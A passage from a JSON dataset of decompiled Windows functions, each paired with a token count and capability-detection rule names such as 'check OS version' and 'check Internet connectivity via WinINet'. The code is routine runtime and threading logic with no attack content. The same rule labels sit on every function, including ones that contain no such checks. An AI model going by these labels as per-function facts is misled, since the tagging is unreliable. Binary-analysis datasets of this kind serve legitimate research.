        "decompiled_code": "\nvoid __fastcall fcn.0041e550(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint uStackY128;\n    uint uStackY124;\n    uchar *puStackY120;\n    uint uStackY116;\n    uint uStackY112;\n    uchar *puStackY108;\n    uint arg_8h;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack92 = &stack0xfffffffc;\n    uStack72 = 0x41e871;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x41e589;\n    fcn.0041e940();\n    puStack80 = 0x41e598;\n    (**(**0x4979b0 + 0x14))();\n    uStack84 = 0x41e84f;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 0x41e810;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack80 = &stack0xfffffffc;\n    (**(*in_EAX + 0x28))();\n    if (param_2 == NULL) {\n        fcn.0041e964();\n        iVar1 = fcn.00418fe8();\n        var_ch = (**(iVar1 + 0x2c))();\n        fcn.0041e964();\n        (**(*var_ch + 0x18))();\n    }\n    else {\n        fcn.0041e964();\n        var_ch = param_2;\n        if ((*(param_2 + 7) & 0x10) == 0) {\n            *(param_2 + 7) = *(param_2 + 7) | 1;\n            *(param_2 + 7) = *(param_2 + 7) | 2;\n            fcn.0041e964();\n            fcn.0041e4f0();\n            (**(*param_2 + 0x18))();\n        }\n        else {\n            fcn.0041e964();\n        }\n    }\n    in_EAX[6] = var_ch;\n    arg_8h = 1;\n    puStackY108 = 0x41e668;\n    fcn.00404528();\n    puStackY108 = 0x41e676;\n    iVar1 = fcn.00418d38(arg_8h);\n    in_EAX[0x21] = iVar1;\n    uStackY112 = 0x41e7b5;\n    uStackY116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    in_EAX[7] = var_ch;\n    puStackY120 = 0x41e69b;\n    puStackY108 = &stack0xfffffffc;\n    iVar1 = fcn.00407688();\n    iVar1 = *(iVar1 + 8);\n    if (iVar1 == 0) {\n        puStackY120 = 0x41e6c1;\n        iVar2 = fcn.00404620();\n        in_EAX[0xd] = iVar2;\n    }\n    else {\n        in_EAX[0xd] = iVar1;\n    }\n    uStackY124 = 0x41e792;\n    uStackY128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    puStackY120 = &stack0xfffffffc;\n    iVar2 = fcn.004198e4();\n    if (iVar2 < 0) {\n        fcn.00419730();\n    }\n    in_EAX[10] = in_EAX[6];\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 1;\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 2;\n    (**(*in_EAX[6] + 0x14))();\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) & 0xfffd;\n    if ((iVar1 == 0) && (iVar2 = *(in_EAX[0xd] + 8),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00419888();\n            (**(*piVar3 + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStackY128;\n    puStackY120 = 0x41e799;\n    if (iVar1 == 0) {\n        uStackY124 = 0x41e789;\n        fcn.00404650();\n    }\n    in_EAX[0xd] = 0;\n    return;\n}\n",
        "token_count": 1280
    },
    "0041e884": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041e8e3)\n// WARNING: Removing unreachable block (ram,0x0041e8f2)\n\nvoid fcn.0041e884(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x41e92e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x41e901;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    cVar1 = fcn.0041eb40();\n    if (cVar1 != '\\v') {\n        fcn.0041c9e8();\n    }\n    fcn.004164d8();\n    fcn.0041e964();\n    *in_FS_OFFSET = uStack48;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41e935;\n    uStack32 = 0x41e92d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 318
    },
    "0041eb54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041eb54(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack20 = 0x41eb90;\n    fcn.0041e964();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41eb97;\n    uStack20 = 0x41eb8f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 148
    },
    "0041eef0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041eef0(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.004055c8();\n    var_8h = 0;\n    if (*(in_EAX + 0x1c) != 0) {\n        var_8h = fcn.00420464();\n    }\n    if (var_8h == 0) {\n        if (*(in_EAX + 0x5a) != 0) {\n            (**(in_EAX + 0x58))(&var_8h, param_1);\n        }\n        if (var_8h == 0) {\n            var_10h = var_4h;\n            var_ch._0_1_ = 0xb;\n            uVar1 = 0;\n            fcn.0040dbe4(0, &var_10h);\n            fcn.00404ec4();\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 311
    },
    "0041efe8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0041efe8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack12;\n    \n    iStack12 = fcn.0041cf04();\n    if (((iStack12 == 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x1c) != *(in_EAX + 0x18))) {\n        iStack12 = fcn.0041cf04();\n    }\n    if (*(in_EAX + 0x6a) != 0) {\n        (**(in_EAX + 0x68))(&iStack12);\n    }\n    if (iStack12 != 0) {\n        cVar1 = fcn.0040487c();\n        if (cVar1 != '\\0') goto code_r0x0041f052;\n    }\n    fcn.00418f28();\ncode_r0x0041f052:\n    return CONCAT44(iStack12, iStack12);\n}\n",
        "token_count": 227
    },
    "0041f69c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f69c(void)\n\n{\n    sub.kernel32.dll_InitializeCriticalSection(0x4979d0);\n    *0x4979b8 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0, 0x41f6cc);\n    if (*0x4979b8 == 0) {\n        fcn.0040f25c();\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "0041f734": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041f734(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY108;\n    uint uStackY104;\n    uchar *puStackY100;\n    uint uStackY96;\n    uint uStackY92;\n    uchar *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint uStackY76;\n    uchar *puStackY72;\n    uint uStackY68;\n    uint uStackY64;\n    uint uStackY60;\n    uint uStackY56;\n    uchar *puStackY52;\n    uint uStackY48;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    puStackY100 = &fcn.0041f734::var_1h + 1;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != **0x4927d8) {\n        var_14h = sub.kernel32.dll_GetCurrentThreadId_1();\n        var_10h._0_1_ = 0;\n        uStackY48 = 0x41f772;\n        fcn.0040dbe4(0, &fcn.0041f734::var_14h);\n        uStackY48 = 0x41f777;\n        fcn.00404ec4();\n    }\n    if (in_EAX < 1) {\n        uStackY48 = 0x41f789;\n        fcn.0041f6e8();\n    }\n    else {\n        uStackY48 = 0x41f782;\n        fcn.0041f6f4();\n    }\n    var_ch = 0;\n    uStackY48 = 0x4979d0;\n    puStackY52 = 0x41f798;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStackY56 = 0x41f8f9;\n    uStackY60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStackY64 = var_ch;\n    uStackY68 = 0x48fb2c;\n    puStackY72 = 0x41f7b4;\n    puStackY52 = &fcn.0041f734::var_1h + 1;\n    var_ch = sub.kernel32.dll_InterlockedExchange();\n    uStackY76 = 0x41f8da;\n    uStackY80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if ((var_ch == 0) || (*(var_ch + 8) < 1)) {\n        var_1h._0_1_ = '\\0';\n    }\n    else {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((var_1h != '\\0') && (0 < *(var_ch + 8))) {\n        uStackY84 = 0x41f7f6;\n        puStackY72 = &fcn.0041f734::var_1h + 1;\n        var_8h = fcn.00419888();\n        uStackY84 = 0x41f803;\n        fcn.0041977c();\n        uStackY84 = 0x4979d0;\n        puStackY88 = 0x41f80d;\n        sub.kernel32.dll_LeaveCriticalSection();\n        uStackY92 = 0x41f87d;\n        uStackY96 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa0;\n        uStackY104 = 0x41f83e;\n        uStackY108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStackY88 = &fcn.0041f734::var_1h + 1;\n        (**(*var_8h + 8))();\n        *in_FS_OFFSET = uStackY108;\n        *in_FS_OFFSET = uStackY96;\n        puStackY88 = 0x41f884;\n        uStackY92 = 0x4979d0;\n        uStackY96 = 0x41f87c;\n        sub.kernel32.dll_EnterCriticalSection();\n        return;\n    }\n    *in_FS_OFFSET = uStackY80;\n    puStackY72 = 0x41f8e1;\n    uStackY76 = 0x41f8d9;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 1042
    },
    "0041f90c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f90c noreturn (void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41f9a3;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*(in_EAX + 0xd) == '\\0') {\n        uStack40 = 0x41f94d;\n        uStack44 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd4;\n        puStack36 = &stack0xfffffffc;\n        (**(*in_EAX + 4))();\n        *in_FS_OFFSET = uStack44;\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41f9aa;\n    cVar1 = *(in_EAX + 0xf);\n    uStack28 = 0x41f983;\n    (***in_EAX)();\n    *(in_EAX + 4) = 1;\n    uStack28 = 0x41f98f;\n    fcn.0041f710();\n    if (cVar1 != '\\0') {\n        uStack28 = 0x41f99b;\n        fcn.00404650();\n    }\n    // WARNING: Subroutine does not return\n    uStack28 = 0x41f9a2;\n    fcn.00405514();\n}\n",
        "token_count": 377
    },
    "0041fbec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fbec(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    \n    uStack20 = 0x4979d0;\n    puStack24 = 0x41fbfe;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack28 = 0x41fc9e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*0x48fb2c != 0) && (iVar2 = *(*0x48fb2c + 8) + -1,  puStack24 = &stack0xfffffffc,  -1 < iVar2)) {\n        do {\n            ppiVar1 = fcn.00419888();\n            if ((ppiVar1[2] == NULL) &&\n               (((in_EDX != 0 && (in_EDX == **ppiVar1)) ||\n                ((arg_8h._2_2_ != 0 && (((*ppiVar1)[2] == arg_8h && ((*ppiVar1)[3] == arg_ch)))))))) {\n                fcn.0041977c();\n                fcn.00402f1c();\n                fcn.00402f1c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41fca5;\n    uStack28 = 0x4979d0;\n    uStack32 = 0x41fc9d;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 410
    },
    "0041fcac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041fcac(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint var_18h;\n    int32_t *var_ch;\n    int32_t var_5h;\n    \n    uStack36 = 0x41fcbe;\n    unique0x10000124 = param_2;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 == **0x4927d8) {\n        uStack36 = 0x41fcd1;\n        (**(stack0xfffffff8 + 8))();\n        return;\n    }\n    if (var_5h == 0) {\n        var_ch = &fcn.0041fcac::var_18h;\n    }\n    else {\n        uStack36 = 0x41fce6;\n        var_ch = fcn.00402f00();\n    }\n    uVar2 = var_5h ^ 1;\n    if (uVar2 == 0) {\n        var_ch[2] = 0;\n    }\n    else {\n        uStack36 = 0;\n        uStack40 = 0;\n        uStack44 = 0xffffffff;\n        uStack48 = 0;\n        puStack52 = 0x41fd09;\n        iVar1 = sub.kernel32.dll_CreateEventA();\n        var_ch[2] = iVar1;\n    }\n    uStack56 = 0x41fe22;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStack64 = 0x4979d0;\n    puStack68 = 0x41fd31;\n    puStack52 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack72 = 0x41fdfb;\n    iStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    *(var_ch + 1) = var_5h;\n    puStack68 = &stack0xfffffffc;\n    if (*0x48fb2c == 0) {\n        uStack80 = 0x41fd5e;\n        puStack68 = &stack0xfffffffc;\n        *0x48fb2c = fcn.00404620();\n    }\n    *var_ch = stack0xfffffff8;\n    uStack80 = 0x41fd78;\n    fcn.00419730();\n    uStack80 = 0x41fd7d;\n    fcn.0041f710();\n    if (*0x48fb1a != 0) {\n        uStack80 = 0x41fd9a;\n        (**0x48fb18)();\n    }\n    if (uVar2 != 0) {\n        uStack80 = 0x4979d0;\n        puStack84 = 0x41fda8;\n        sub.kernel32.dll_LeaveCriticalSection();\n        uStack88 = 0x41fddc;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        iVar1 = var_ch[2];\n        puStack84 = &stack0xfffffffc;\n        sub.kernel32.dll_WaitForSingleObject(iVar1, 0xffffffff);\n        *in_FS_OFFSET = iVar1;\n        iStack92 = 0x41fde3;\n        sub.kernel32.dll_EnterCriticalSection(0x4979d0);\n        return;\n    }\n    *in_FS_OFFSET = iStack76;\n    puStack68 = 0x41fe02;\n    uStack72 = 0x4979d0;\n    iStack76 = 0x41fdfa;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 941
    },
    "0041ff90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041ff90(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a1c();\n    fcn.004201f8();\n    if (*(iVar1 + 0x14) != 0) {\n        while ((*(iVar1 + 0x14) != 0 && (0 < *(*(iVar1 + 0x14) + 8)))) {\n            piVar2 = fcn.00419888();\n            (**(*piVar2 + 0x10))();\n        }\n        fcn.0040f934();\n    }\n    fcn.0042019c();\n    if (*(iVar1 + 4) != 0) {\n        fcn.00420164();\n    }\n    fcn.00419e04();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "00420018": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420018(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 4) == 0) || (*(in_EAX + 4) != *(param_2 + 4))) {\n        if (*(in_EAX + 0x14) == 0) {\n            uVar1 = fcn.00404620();\n            *(in_EAX + 0x14) = uVar1;\n        }\n        iVar2 = fcn.004198e4();\n        if (iVar2 < 0) {\n            fcn.00419730();\n            fcn.00420018();\n        }\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x100;\n    return;\n}\n",
        "token_count": 202
    },
    "004200ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004200ac(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.00419730();\n    *(param_2 + 4) = in_EAX;\n    return;\n}\n",
        "token_count": 111
    },
    "004200d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004200d8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 4) = 0;\n    fcn.004199cc();\n    if (*(*(in_EAX + 0x10) + 8) == 0) {\n        fcn.00404650();\n        *(in_EAX + 0x10) = 0;\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00420234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00420234(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        fcn.004199cc();\n        if (*(*(in_EAX + 0x14) + 8) == 0) {\n            fcn.00404650();\n            *(in_EAX + 0x14) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "004203cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004203cc(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        cVar1 = fcn.00409a74();\n        if ((cVar1 == '\\0') && (in_EAX == *(in_EDX + 4))) {\n            iVar2 = fcn.00420464();\n            if (iVar2 != 0) {\n                var_ch = arg_8h;\n                var_8h._0_1_ = 0xb;\n                fcn.0040dbe4(0, &var_ch);\n                fcn.00404ec4();\n            }\n        }\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 4) != 0)) {\n        (**(**(in_EAX + 4) + 0x20))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 266
    },
    "00420464": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00420464(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (((param_2 != 0) && (*(in_EAX + 0x10) != 0)) && (iVar3 = *(*(in_EAX + 0x10) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.00419888();\n            cVar1 = fcn.00409a74();\n            if (cVar1 != '\\0') goto code_r0x004204a9;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    uVar2 = 0;\ncode_r0x004204a9:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 207
    },
    "00420558": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00420558(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        fcn.00419814();\n    }\n    fcn.00419888();\n    return;\n}\n",
        "token_count": 59
    },
    "004205e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004205e8(char param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) & 0xffef;\n    }\n    else {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x10;\n    }\n    if ((param_1 != '\\0') && (iVar1 = fcn.00420584(),  -1 < iVar1 + -1)) {\n        do {\n            fcn.00420558();\n            fcn.004205e8();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "004206f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004206f0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        cVar1 = fcn.00404704();\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = (****(arg_8h + 0x20))(*(arg_8h + 0x20), arg_ch, arg_10h);\n    }\n    return uVar2;\n}\n",
        "token_count": 162
    },
    "004208ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004208ac(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a1c();\n    fcn.0041ff90();\n    if (*(iVar1 + 0x30) != 0) {\n        fcn.00420258();\n    }\n    if (*(iVar1 + 0x50) != 0) {\n        while (0 < *(*(iVar1 + 0x50) + 8)) {\n            fcn.00419970();\n            fcn.004209f4();\n        }\n    }\n    fcn.0040f934();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00420940": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00420940(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x42) != 0) {\n        (**(in_EAX + 0x40))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 63
    },
    "0042095c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042095c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x4a) != 0) {\n        (**(in_EAX + 0x48))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 65
    },
    "00420ae4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
